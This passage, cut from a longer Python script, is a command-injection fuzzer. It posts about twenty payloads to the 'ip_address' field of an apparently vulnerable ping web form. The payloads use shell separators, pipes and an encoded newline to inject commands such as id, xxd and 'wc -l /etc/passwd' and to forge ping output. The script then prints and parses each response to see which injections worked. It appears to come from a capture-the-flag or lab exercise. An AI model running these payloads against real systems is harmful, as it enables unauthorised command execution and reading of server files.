    # Try && operator
    'invalid && echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try || operator - execute second if first fails
    'invalid || echo "2 packets transmitted, 2 received, 0% packet loss"',
    
    # Try newline injection with encoded newline
    'invalid%0aecho "3 packets transmitted, 3 received, 0% packet loss"',
    
    # Try using printf with format string
    'invalid;printf "4 packets transmitted, 4 received, 0%% packet loss\\n"',
    
    # What about using tee or other commands?
    'invalid;tee;echo "5 packets transmitted, 5 received, 0% packet loss"',
    
    # Try using # comment then command?
    'invalid#;echo "6 packets transmitted, 6 received, 0% packet loss"',
    
    # Try 
    'invalid'
    'echo "7 packets transmitted, 7 received, 0% packet loss"',
    
    # URL encoded newline
    'invalid%0aecho "8 packets transmitted, 8 received, 0% packet loss"',
    
    # Double semicolon (bash syntax)
    'invalid;;echo "9 packets transmitted, 9 received, 0% packet loss"',
    
    # Try $VAR without parentheses
    'invalid;echo "HOME is $HOME packets transmitted, 1 received, 0% packet loss"',
    
    # Command with arguments that output format
    'invalid;xxd;echo "10 packets transmitted, 10 received, 0% packet loss"',
    
    # Use sed on command output
    'invalid;id;sed "s/.*/11 packets transmitted, 11 received, 0% packet loss/"',
    
    # What if I make the output of id BE the number?
    # First let's see what happens with id output
    'invalid;id',
    
    # Check if we can use awk
    'invalid;id|awk "{print \"12 packets transmitted, 12 received, 0% packet loss\"}"',
    
    # Try reversing with rev
    'invalid;id|rev',
    
    # Test if PIPE is actually blocked or just filtered
    'invalid|id',
    
    # Try word count of something
    'invalid;wc -c /etc/passwd',
    
    # Get number of lines as the transmitted count
    'invalid;wc -l /etc/passwd;echo " packets transmitted, 1 received, 0% packet loss"',
    
    # Try to output format with command substitution through environment
    'invalid;export X=99;echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # Set variable from command output using read
    'invalid;id|read X;echo "$X packets transmitted, 1 received, 0% packet loss"',
]

print("="*80)
print("Testing Alternative Injection Methods")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {repr(payload)}")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        print(f"Response ({len(resp.text)} chars):")
        print(resp.text)
        
        # Extract the displayed values
        match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
        if match:
            trans, recv, loss = match.groups()
            print(f"[EXTRACTED] Transmitted: '{trans}', Received: '{recv}', Loss: '{loss}'")
            
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text,
            'match': match.groups() if match else None
        })
        
    except Exception as e:
        print(f"ERROR: {e}")

# Analysis
print("\n" + "="*80)
print("ANALYSIS: Successful Custom Values")
print("="*80)
for r in results:
    if r['match']:
        trans = r['match'][0]
        if trans not in ['2'] and 'ping:' not in trans:
            print(f"\n[TEST {r['test']}] Transmitted='{trans}'")
            print(f"Payload: {r['payload'][:60]}...")

